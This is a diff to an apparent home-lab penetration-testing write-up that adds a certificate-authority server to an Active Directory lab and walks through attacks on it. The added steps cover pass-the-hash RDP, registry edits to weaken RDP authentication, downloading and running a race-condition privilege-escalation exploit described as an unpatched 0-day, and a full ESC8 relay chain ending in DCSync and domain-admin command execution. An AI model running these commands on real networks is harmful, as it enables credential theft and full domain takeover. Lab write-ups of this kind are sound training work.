@@ -3035,7 +3035,7 @@ Check Extended Protection, For our vulnerable lab:
 These are the steps to set up a CA on the same machine as the DC as covered above, unless we had a way to defeat the reflection protection itself, this setup can't be abused for ESC8. It's here purely for completeness/practice.
 
 
-##### Setting up the ADCS for the lab  : 
+##### CA01 : Setting up the ADCS for the lab  : 
 
 First we will set up a new Windows Server , the same Steps as we did with the DC01 will be done to create the VM :
 
@@ -3339,7 +3339,7 @@ Now we should have 2 NIC for this one :
 
 <img width="1531" height="798" alt="image" src="https://github.com/user-attachments/assets/b94c75bf-9523-43a0-a716-b9ea8f1abb78" />
 
-#### ORNN / DC01 / Rogue : 
+#### ORNN / DC01 / CA01 / Rogue  : 
 
 Same as Backup and Dirt2Geddon : 
 
@@ -3356,11 +3356,13 @@ Here's the addressing plan for 10.10.10.0/24 :
 - Backup	10.10.10.30	
 - ORNN	10.10.10.40	 
 - Rogue	10.10.10.50	
-- DC01	10.10.10.100	
+- DC01	10.10.10.100
+- CA01  10.10.10.101
 
+   
 **Quick Notes :**
 
-*DC01 isn't part of this addressing chain at all, it's a self-contained scenario that just happens to share the same wire. We'll set it up on its own at the end, pointing DNS at itself.*
+*DC01 isn't part of this addressing chain at all, it's a self-contained scenario that just happens to share the same wire. We'll set it up on its own at the end, pointing DNS at itself.And for CA01 since it is part of the Domain , the DNS will be the DC01*
 *ORNN will serve as the DNS Server for all 5 machines except the DC since it needs to be its own DNS server*
 
 
@@ -3710,6 +3712,37 @@ Pointing DC01's own DNS at 127.0.0.1 isn't just a formality here, it's actually 
 Now everything is set . We can test the Connectivity . 
 
 
+##### CA01 : 
+
+For the CA01 , the DNS server will be the DC01 , But first let's give it a static IP address as well .
+
+```powershell
+# Remove any existing IP/route config first
+Remove-NetIPAddress -InterfaceAlias "Ethernet0" -Confirm:$false
+Remove-NetRoute -InterfaceAlias "Ethernet0" -Confirm:$false
+
+# Set static internal IP
+New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.10.10.101 -PrefixLength 24
+
+# Point DNS at DC01
+Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 10.10.10.100
+```
+
+<img width="1087" height="552" alt="image" src="https://github.com/user-attachments/assets/0d99372b-6f11-4c3e-b5a9-0a8ec9d37a71" />
+
+Now to verify : 
+
+```powershell
+ipconfig
+Get-DnsClientServerAddress -InterfaceAlias "Ethernet0"
+```
+
+<img width="878" height="543" alt="image" src="https://github.com/user-attachments/assets/8f5b7d1e-71bc-4a88-bbf6-288a5c2923a3" />
+
+The IP address is now static and the DNS is the DD01 . 
+
+Now let's test the connectivity . 
+
 #### Testing connectivity : 
 
 
@@ -3859,9 +3892,27 @@ Now from the DC let's check if we can resolve the other machines :
 
 Again , Rogue shouldn't work since it's a Windows :)
 
-Now the Networking section is done . We can move on to the Attack phase . 
 
+##### CA01 :
 
+For the CA01, what interests us the most is resolving the Domain name , and the connectivity with the DC01 , if it can do both , then it will definetly reach the other internal Hosts : 
+
+To verify , first we check if we can resolve the Domain name using our DNS : 
+
+```powershell
+nslookup Isolate.local
+```
+
+Then we test the connectivity , we will need to test the ports directly , skipping the ICMP pings , since it will be blocked by default . 
+
+```powershell
+Test-NetConnection -ComputerName 10.10.10.100 -Port 445 -InformationLevel Detailed
+Test-NetConnection -ComputerName 10.10.10.100 -Port 389
+```
+
+<img width="1131" height="673" alt="image" src="https://github.com/user-attachments/assets/bac0f7b8-03e7-4b3a-b4e8-a8f4c37dc36e" />
+
+The DNS is working , and we can communicate with the DC01 in the Internal Network without any issues . We can finally move to the Attack phase .
 
 
 ## Attack Phase : 
@@ -5020,6 +5071,220 @@ nxc rdp 10.10.10.50 -u elmehdi -H c22b315c040ae6e0efee3518d830362b
 We see the pwn3d! which means this user can login via RDP .
 
 So now all we need to do is RDP to the machine , import our exploit , run it and it should give us System . 
+
+```bash
+xfreerdp3 /v:10.10.10.50 /u:elmehdi /pth:c22b315c040ae6e0efee3518d830362b /cert:ignore +clipboard /dynamic-resolution /drive:SHARED,.
+```
+
+Here we're using the Hash to login via RDP , the /drive is to have a shared drive between our Kali machine and the target machine , to easily import our Tools : 
+
+<img width="1609" height="619" alt="image" src="https://github.com/user-attachments/assets/4fa33650-de35-4e93-8619-144dd8b72658" />
+
+This won't work, since elmehdi is part of the local Admin group , so we can't just login using pth via RDP . 
+
+To enable PTH for Administrators on the machine we need to modify it using the registry :
+
+```powershell
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+```
+
+We already has System so we will be able to execute this , or just Login to Rogue normally and modify it so that you can proceed with the attack . 
+
+We also need to disable NLA : 
+
+NLA (Network Level Authentication) is blocking PTH for non-RID-500 accounts at the RDP layer specifically, which is separate from the UAC token filtering :
+
+```bash
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
+
+# Then to verify :
+Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication"
+```
+
+<img width="1211" height="401" alt="image" src="https://github.com/user-attachments/assets/55689713-3443-4f64-ada3-ea6205a5cc33" />
+
+If the RDP using PTH doesn't work, just login normally , Download the Exploit on you Kali machine , transfer it to the Pivot Box and from there , Import it to the Rogue machine . (Or you could create a new listner on Ligolo that will forward traffic from port 80 on the Pivot box back to our local port 80 , and from there we use wget and specify the IP address of the Pivot box instead of ours ) 
+
+Let's try it quickly , instead of port 80 let's use 8888 , first create the listener on our Ligolo server :
+
+```bash
+listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888 --tcp
+```
+
+<img width="1556" height="734" alt="image" src="https://github.com/user-attachments/assets/43e7fb59-44df-46f9-a22d-647637358f57" />
+
+Then we Download the Exploit : 
+
+```bash
+https://github.com/MSNightmare/RoguePlanet
+git clone https://github.com/MSNightmare/RoguePlanet.git
+```
+
+<img width="1111" height="694" alt="image" src="https://github.com/user-attachments/assets/457910e4-d0e9-416c-8b77-76a6eb438bc0" />
+
+Now we just setup our Python Server , on port 8888 :
+
+```bash
+python3 -m http.server 8888
+```
+
+Finally on the Rogue machine , we use IWR or Wget but we specify the IP address of our Pivot Box not our Kali IP , and it will be forwarded automatically using Ligolo : 
+
+```bash
+wget http://10.10.10.10:8888/RoguePlanet.exe -o Rogue.exe
+```
+
+<img width="1259" height="641" alt="image" src="https://github.com/user-attachments/assets/c5396f2c-5b4f-4b91-8c31-f8c88e7fc347" />
+
+Now back on our Python Server , we see that we got a callback and we get a 200 which means the executable was transfered successfully . 
+
+<img width="1106" height="453" alt="image" src="https://github.com/user-attachments/assets/190c1130-5bfe-4cde-a978-2a6e412bccbd" />
+
+Now finally we just Run the Exploit and Hope we get System : 
+
+<img width="1212" height="673" alt="image" src="https://github.com/user-attachments/assets/7f2f2931-a73d-449f-8053-52b1696d26c2" />
+
+Note that this is a Race Condition Vulnerability which means it might not always work , i got it to work twice, and it was same day when it came out , from there it didn't work for me :)
+
+The exploit abuses a timing window between file creation and Windows Defender's processing of that file, so the window can open and close without you catching it depending on system load, timing, and luck. I got it to work on the same day the exploit dropped; since then it's been hit or miss.
+
+At the time of writing, there is still no official patch for this vulnerability. It will likely be addressed in an upcoming Patch Tuesday, so by the time you're reading this, the exploit may no longer work on a fully patched system — which is also why it makes sense as a lab scenario: it documents a real, working 0-day at the time this lab was built, even if its shelf life is limited.``
+
+
+### DC01 / CA01 : 
+
+First we start by scanning both : 
+
+```bash
+nmap 10.10.10.100 10.10.10.101
+```
+
+<img width="1134" height="832" alt="image" src="https://github.com/user-attachments/assets/fdd0380e-0bc9-4d06-abe2-cc91d8e1a752" />
+
+Looking at the scan result , we can tell that 10.10.10.100 is the DC , from having LDAP, Kerberos and DNS . 
+
+First thing we should do is add the Domain name as well as the hostnames to our /etc/hosts file . we can use nxc to generate the hostfile : 
+
+```bash
+nxc smb targets --generate-hosts-file hosts
+```
+
+<img width="1849" height="581" alt="image" src="https://github.com/user-attachments/assets/f8650756-9325-4bcf-b9d3-6bc2b513f641" />
+
+Now we just add those lines to our hosts file : 
+
+<img width="1103" height="639" alt="image" src="https://github.com/user-attachments/assets/908dc20e-f0a7-414b-b006-d137023f24cc" />
+
+Looking at nxc result we know which machine is the DC and which one is the Certificate Authority server . 
+
+To save time , we won't do it blindly , since AD Enumeration can be pretty time consuming , but if you want more enumeration you can check this Checklist : 
+
+```bash
+https://elmehdilaassiri.github.io/posts/oscp-cpts-methodology/#active-directory-
+```
+
+First we will check the quick wins , let's see if the DC is vulnerable to any of the coercion attacks . 
+
+But for this we first need valid creds , which we got from the NFS server , let's test them first : 
+
+```bash
+nxc smb DC01.Isolate.local -u svc_backup -p 'Backup@123'
+```
+
+<img width="1537" height="231" alt="image" src="https://github.com/user-attachments/assets/867755b7-4d06-464c-b93b-ca44c4fda04d" />
+
+Perfect we got valid creds , we can test for coercion attacks , we can use the module Coerce plus from nxc which will test multiple vulnerabilities , like petitpotam , printspooler , DFSCoerce, etc : 
+
+```bash
+nxc smb DC01.Isolate.local -u svc_backup -p 'Backup@123' -M coerce_plus
+```
+
+<img width="1168" height="331" alt="image" src="https://github.com/user-attachments/assets/60a575ec-468e-461a-8c82-6640cc686f0a" />
+
+Perfect , it is vulnerable . 
+
+Now before we continue let me explain to you the attack that we're going to perform : 
+
+**What is ESC8 ?**
+
+ESC8 is one of the ADCS privilege escalation paths documented in SpecterOps' "Certified Pre-Owned" research. It abuses the Certificate Authority Web Enrollment interface (/certsrv/) which accepts NTLM authentication by default, without requiring Extended Protection for Authentication (EPA) making it vulnerable to NTLM relay attacks.
+
+*The attack works in three stages:*
+
+- Coercion : force a privileged machine (in our case, the Domain Controller) to authenticate outbound to an attacker-controlled listener using one of several well-known coercion techniques (PetitPotam, PrinterBug, DFSCoerce, etc.)
+- Relay : intercept that NTLM authentication and relay it to the CA's Web Enrollment endpoint, requesting a certificate on behalf of the coerced machine account (DC01$) using the AD integrated DomainController certificate template
+- Abuse : use the issued certificate to authenticate via Kerberos PKINIT, obtaining a TGT for DC01$, which has domain replication rights enabling a full DCSync and dumping every credential in the domain including krbtgt
+
+The key prerequisite is that the CA and the coerced machine must be two separate boxes relaying a machine's auth back to a service running on that same machine triggers Windows' built-in NTLM reflection protection and fails silently, which is exactly why we set up a dedicated CA server instead of running ADCS directly on the DC.
+
+Now first we confirmed that we can perform the coercion , now we just need to setup our Relay server , and make sure we're relaying back to the CA01 machine , for this we will use ntlmrelay from impacket : 
+
+```bash
+impacket-ntlmrelayx -t http://10.10.10.101/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
+```
+
+<img width="1418" height="737" alt="image" src="https://github.com/user-attachments/assets/f5c81702-11d2-4c2f-a7c5-a1ba8351fb42" />
+
+Now we Trigger the coercion : force DC01 to authenticate back to Kali via PetitPotam:
+
+Since everything is on the internal segment now and routed through Ligolo, the listener IP needs to be your Ligolo tun interface IP (10.10.10.10), which the DC can reach back through the pivot:
+
+```bash
+nxc smb 10.10.10.100 -u 'svc_backup' -p 'Backup@123' -M coerce_plus -o LISTENER=10.10.10.10 METHOD=PetitPotam
+```
+
+<img width="1564" height="671" alt="image" src="https://github.com/user-attachments/assets/d5f51785-5efd-45f7-97b8-cb9e78ed18d9" />
+
+This didn't work since it will connect back to the Pivot box , but we haven't created any listener that will forward the traffic back to our Kali host . 
+
+For this we need to go back to Ligolo and create a new listener that will forward all traffic coming to port 445 on the Pivot Box directly to our local port 445. 
+
+```bash
+ligolo-ng » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+```
+
+<img width="1445" height="456" alt="image" src="https://github.com/user-attachments/assets/5a503198-0052-4f63-8ab7-2b784b3e8c49" />
+
+So the new flow now is : 
+
+```text
+DC01 → authenticates to Fail2Copy:445 → Ligolo forwards → Kali:445 → ntlmrelayx catches and relays → CA01 Web Enrollment
+```
+
+Now if we try again :
+
+<img width="1531" height="725" alt="image" src="https://github.com/user-attachments/assets/e8c09e94-e818-42d4-bfc7-99900e73fad2" />
+
+It worked perfectly, and we got the PFX certificate for DC01$. We'll use this certificate to authenticate via Kerberos PKINIT and obtain a TGT using Certipy:
+
+```bash
+certipy auth -pfx ./DC01.pfx -dc-ip 10.10.10.100
+```
+
+Certipy handles the PKINIT exchange automatically , it authenticates the certificate against the DC, retrieves a TGT for DC01$, and also extracts the NT hash of the machine account directly, which we can use for pass-the-hash if needed.
+
+<img width="1167" height="455" alt="image" src="https://github.com/user-attachments/assets/2cb21d84-d155-4ef3-ace4-b9f8d4e6208f" />
+
+Now we have the Hash for the DC01$ which is a machine account , we won't use it to login , but instead we will dump all Hashes on the Domain , and from there login using the Domain Administrator Hash . 
+
+<img width="1217" height="387" alt="image" src="https://github.com/user-attachments/assets/0e48d87d-43ae-4c05-b76c-77c80c9e4061" />
+
+Now we can use it to authenticate , execute commands via nxc , etc . 
+
+```bash
+nxc smb 10.10.10.100 -u 'administrator' -H 43d4cf17b072d8b25ecb5fea0d04c62d -x whoami
+```
+
+<img width="1434" height="533" alt="image" src="https://github.com/user-attachments/assets/225de73e-4e4d-4abe-87df-47ae231e74ea" />
+
+We now have Full domain Compromise through an ESC8 .
+
+
+
+
+
+
+
 
 
 
